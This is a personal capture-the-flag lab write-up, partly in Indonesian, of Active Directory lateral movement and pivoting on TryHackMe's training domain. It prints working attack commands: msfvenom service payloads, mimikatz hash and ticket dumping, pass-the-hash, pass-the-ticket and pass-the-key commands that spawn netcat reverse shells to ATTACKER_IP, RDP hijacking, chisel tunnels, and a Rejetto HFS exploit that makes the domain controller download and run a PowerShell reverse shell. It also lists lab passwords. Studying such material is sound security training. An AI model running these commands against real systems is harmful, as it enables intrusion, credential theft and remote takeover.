---
title: "Lateral Movement and Pivoting"
description: "Configure Environment config ip DNS Spawning Processes Remotely To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from"
lang: "en"
translationKey: "lateral-movement-and-pivoting"
category: "lab-writeups"
tags: []
publishDate: "2024-12-13"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "15b5fca1-ed80-806d-9fcd-cec0c2c44ae4"
notionUrl: "https://app.notion.com/p/Lateral-Movement-and-Pivoting-15b5fca1ed80806d9fcdcec0c2c44ae4"
notionLastEdited: "2025-05-31T16:52:00.000Z"
---

# Configure Environment

config ip DNS

![](/images/lateral-movement-and-pivoting/b7aed61899fb.png)

# Spawning Processes Remotely

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_leonard.summers

**Password:** EZpass4ever

We'll show how to use those credentials to move laterally to THMIIS using `sc.exe`. Feel free to try the other methods, as they all should work against THMIIS.

While we have already shown how to use sc to create a user on a remote system (by using `net user`), we can also upload any binary we'd like to execute and associate it with the created service. However, if we try to run a reverse shell using this method, we will notice that the reverse shell disconnects immediately after execution. The reason for this is that service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately. Luckily for us, msfvenom supports the `exe-service` format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.

To create a reverse shell, we can use the following command:

**Note: **Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myservice.exe" to avoid overwriting someone else's payload.

```bash
msfvenom -p windows/shell_reverse_tcp -f exe-service LHOST=10.50.17.72 LPORT=4443 -o exploit.exe
```

![](/images/lateral-movement-and-pivoting/d3887c61598d.png)

Then we doing enumeration which shared folder has write permission on the target

![](/images/lateral-movement-and-pivoting/d2b2705b9409.png)

after knowing the shared folder which has a write permission, then we proceed to use t1_leonard.summers credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our AttackBox:

```bash
smbclient -c 'put exploit.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

![](/images/lateral-movement-and-pivoting/5992ad4606ab.png)

check that our .exe has success to be uploaded

```bash
smbclient -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

before:

![](/images/lateral-movement-and-pivoting/08cb9b98431b.png)

After:

![](/images/lateral-movement-and-pivoting/1fecbf52c2c7.png)

Once our executable is uploaded, then proceed to create a new service remotely by using sc, associating it with our uploaded binary:

```bash
# create a service
sc.exe \\thmiis.za.tryhackme.com create <nama_service> binPath= "%windir%\myservice.exe" start= auto
```

![](/images/lateral-movement-and-pivoting/f0d6c22d4529.png)

Then running the service while listening on using nc, Voila we got nt/authority on **thmiis** 

![](/images/lateral-movement-and-pivoting/d9c0524ed78b.png)

![](/images/lateral-movement-and-pivoting/b7e756d80178.png)

# Moving Laterally Using WMI

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you on Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_corine.waters

**Password:** Korine.1994

We'll show how to use those credentials to move laterally to THM-IIS using WMI and MSI packages. Feel free to try the other methods presented during this task.

We will start by creating our MSI payload with msfvenom from our attacker machine:

**Note:** Since you will be sharing the lab with others, you'll 
want to use a different filename for your payload instead of 
"myinstaller.msi" to avoid overwriting someone else's payload.

![](/images/lateral-movement-and-pivoting/8324413ccf02.png)

then transfer our .msi malware into shared folder

![](/images/lateral-movement-and-pivoting/88d2fe3e4ab4.png)

Then start a WMI session against THMIIS from a Powershell console:

![](/images/lateral-movement-and-pivoting/50769c65f33a.png)

We then invoke the Install method from the Win32_Product class to trigger the payload:

![](/images/lateral-movement-and-pivoting/57057ff410b9.png)

voila we got nt/authority on THMIIS.

![](/images/lateral-movement-and-pivoting/a941c2e548fe.png)

# Pass the Hash

**Extracting NTLM hashes from local SAM:**

This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

![](/images/lateral-movement-and-pivoting/9927daa77de5.png)

**Extracting NTLM hashes from LSASS memory:**

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

![](/images/lateral-movement-and-pivoting/5de14696b864.png)

We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:

```bash
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Notice we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.

This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

**Passing the Hash Using Linux:**

If you have access to a linux box (like your AttackBox), several tools have built-in support to perform PtH using different protocols. Depending on which services are available to you, you can do the 
following:

*Connect to RDP using PtH:*

```text
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

*Connect via psexec using PtH:*

```text
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

**Note:** Only the linux version of psexec support PtH.

*Connect to WinRM using PtH:*

```text
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

# Pass the Ticket

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

# **Overpass-the-hash / Pass-the-Key**

This kind of attack is similar to PtH but applied to Kerberos networks.

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (`nc64` is already available in THMJMP2 for your convenience):

**If we have the RC4 hash:**

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES128 hash:**

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES256 hash:**

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as **Overpass-the-Hash (OPtH)**.

**Contoh pass-the-hash**

```bash
privilege::debug
token::elevate
sekurlsa::msv
```

![](/images/lateral-movement-and-pivoting/930032cfa01d.png)

```bash
impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
```

![](/images/lateral-movement-and-pivoting/e71354872905.png)

cara 2 :

before doing this, you need to run command `token::revert` in order to revert your token, I’ve tried pth before this command and failed.

![](/images/lateral-movement-and-pivoting/9a651c7eeaab.png)

**Contoh pass-the-ticket dari Windows**

```bash
# first dump the tickets
privilege::debug
token::elevate
sekurlsa::tickets /export
kerberos::ptt <ticket file>
winrs.exe -r:<host target> powershell.exe
```

![](/images/lateral-movement-and-pivoting/25a39e02c8fa.png)

pass the ticket of user t1_toby.beck

![](/images/lateral-movement-and-pivoting/c5849943196e.png)

check if the ticket has successfully in our session

![](/images/lateral-movement-and-pivoting/91e204f97b97.png)

voila we successfully doing lateral movement into THMIIS as user t1_toby.beck

![](/images/lateral-movement-and-pivoting/e554bbf51c23.png)

**Contoh pass the ticket dari linux**

```bash
# Convert the ticket to Linux format
impacket-ticketConverter \[0\;ca99f8\]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi t1_toby.beck.ccache

# Set an environment variable for Impacket
export KRB5CCNAME=t1_toby.beck.ccache

# Using wmiexec here as an example
impacket-wmiexec za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com -k -no-pass
```

![](/images/lateral-movement-and-pivoting/d5228f2d0405.png)

**Contoh pass-the-key dari windows**

dump the keys:

```bash
# first dump the keys
privilege::debug
token::elevate
sekurlsa::ekeys
winrs.exe -r:<nama host> powershell.exe
```

![](/images/lateral-movement-and-pivoting/ba69f3a134bf.png)

pass the key of user t1_toby.beck :

![](/images/lateral-movement-and-pivoting/19f8a7562cb3.png)

Referensi: [https://strontic.github.io/xcyclopedia/library/winrs.exe-FF0007592245B0EF82886AB224CC8302.html](https://strontic.github.io/xcyclopedia/library/winrs.exe-FF0007592245B0EF82886AB224CC8302.html)

**Contoh pass the key dari linux**

```bash
# Request a TGT using the AES-256 hash
impacket-getTGT 'za.tryhackme.com/t1_toby.beck' -aesKey 6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e

# Create an environment variable for Impacket
export KRB5CCNAME=t1_toby.beck.ccache

# Get a shell
impacket-wmiexec 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com' -k -no-pass
```

![](/images/lateral-movement-and-pivoting/4f93673d2e26.png)

# Abusing User Behaviour

## RDP Hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:

![](/images/lateral-movement-and-pivoting/dff05c6ea5eb.png)

From there, run `PsExec64.exe`(available at `C:\tools\`):

```bash
PsExec64.exe -s cmd.exe
```

![](/images/lateral-movement-and-pivoting/6af03391f8fc.png)

To list the existing sessions on a server, you can use the following command:

```bash
query user
```

![](/images/lateral-movement-and-pivoting/79d6e5da5992.png)

According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#14`. We can also see that a user named t1_toby.beck has left a session open with id `8`. Any session with a **Disc** state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.

To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover t1_toby.beck's session if we were connected as the administrator user, we'd use the following command:

```bash
tscon 8 /dest:rdp-tcp#14
```

![](/images/lateral-movement-and-pivoting/01ea1a36c34c.png)

# Port Forwarding

our issue is we can’t RDP into THMIIS but when we enumerate the target we found that port 3389 only accessible via internal network which is THMJMP2.                                                                           

![](/images/lateral-movement-and-pivoting/5e617d7ffca7.png)

from thmjmp2

![](/images/lateral-movement-and-pivoting/1e9ad61f7ede.png)

## Port Forward Using Chisel

first ssh into jumphost, which is JMP2

```bash
# Use the credentials obtained from the distributor
ssh username@za.tryhackme.com@thmjmp2.za.tryhackme.com
```

Transfer the `chisel.exe` file to your SSH session. Start a web server on Kali.

```bash
sudo python3 -m http.server 80
```

Download the file to `thmjmp2` . Start a PowerShell terminal.

```bash
powershell.exe
Invoke-WebRequest 'http://kali-vpn-ip/chisel.exe' -OutFile .\chisel.exe
```

**Config File ProxyChains for using Chisel**

```bash
subl /etc/proxychains4.conf and /etc/proxychains.conf
```

![](/images/lateral-movement-and-pivoting/4364d8cf720d.png)

our conditions is we want to connect into THMIIS via RDP but we got filtered and can’t to connect port 3389 like the following.

![](/images/lateral-movement-and-pivoting/b914c249fb16.png)

but from the inside of THMJMP2 we got that port 3389 is open, which means outbound connection into port 3389 is disabled so let’s we use chisel for doing pivoting.

![](/images/lateral-movement-and-pivoting/c38c17a6c863.png)

we’ve successfully establish pivoting using chisel and we’re able to see that port 3389(RDP) is open, now let’s we login using user `t1_thomas.moore : MyPazzw3rd2`

![](/images/lateral-movement-and-pivoting/2467f29edaf0.png)

## **Exploit Rejetto HFS on the Domain Controller**

edit proxychains configuration

```bash
sudo nano /etc/proxychains4.conf
```

Go down to the `[ProxyList]` section and add your proxy connection.

![](/images/lateral-movement-and-pivoting/fdfb0fcf0ffd.png)

**Port scan the DOMAIN CONTROLLER**

According to the lesson, Rejetto HFS is running on `TCP/80` . Also, since we are going through a SOCKS proxy to reach the server, you have to specify a full TCP SYN scan with `-sT` .

```bash
sudo proxychains -q nmap -Pn -sT -sV -p80 -T4 thmdc.za.tryhackme.com
```

![](/images/lateral-movement-and-pivoting/7440eff77d18.png)

**Set up Port Forwarding and Reverse Dynamic Socks Proxy**

First on our THMJMP2 running the chisel client

```bash
.\chisel client 10.50.17.
72:8080 R:socks 0.0.0.0:50080:10.50.17.72:80 0.0.0.0:50081:10.50.17.72:81
```

> note: all traffic THMJMP2 on port 50080 will be forwarded into kali linux port 80 also port 50081 will be forwarded into 81

second on our kali linux running the chisel server

```bash
./chisel server -p 8080 --reverse --socks5
```

![](/images/lateral-movement-and-pivoting/2cb61c393cad.png)

**Download the Reverse Shell Payload**

I'll be using this PowerShell reverse shell [**payload here**](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1?ref=benheater.com).

```bash
wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
```

Modify the payload. We're telling the ***domain controller ***to connect to `thmjmp2` on `TCP/50081` , which fill forward in **reverse** to Kali on `TCP/81` .

```bash
$socket = new-object System.Net.Sockets.TcpClient('thmjmp2.za.tryhackme.com', 50081);
```

![](/images/lateral-movement-and-pivoting/671ad4c2d847.png)

**Copy and Review the Python Payload**

```bash
searchsploit Rejetto

Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py
```

Copy the payload to your working directory.

```bash
searchsploit -m 49125
```

Review the exploit. With the way I've staged my environment, looks like I should be able to get a reverse shell with this command:

```bash
proxychains -q python3 49125.py thmdc.za.tryhackme.com 80 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://thmjmp2.za.tryhackme.com:50080/mini-reverse.ps1')"
```

Now, let's do the following steps on our kali linux:

- Start a Python web server to host the `mini-reverse.ps1` payload
```bash
sudo python3 -m http.server 80
```

- Start a `netcat` listener catch the shell
```bash
sudo rlwrap nc -lnvp 81
```

then running the exploit:

```bash
sudo proxychains -q python3 49125.py thmdc.za.tryhackme.com 80 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://thmjmp2.za.tryhackme.com:50080/mini-reverse.ps1')"
```

![](/images/lateral-movement-and-pivoting/273b22937bea.png)

then voila we succeed to get revshell on our kali linux.

![](/images/lateral-movement-and-pivoting/9e8c4f8e9e5f.png)
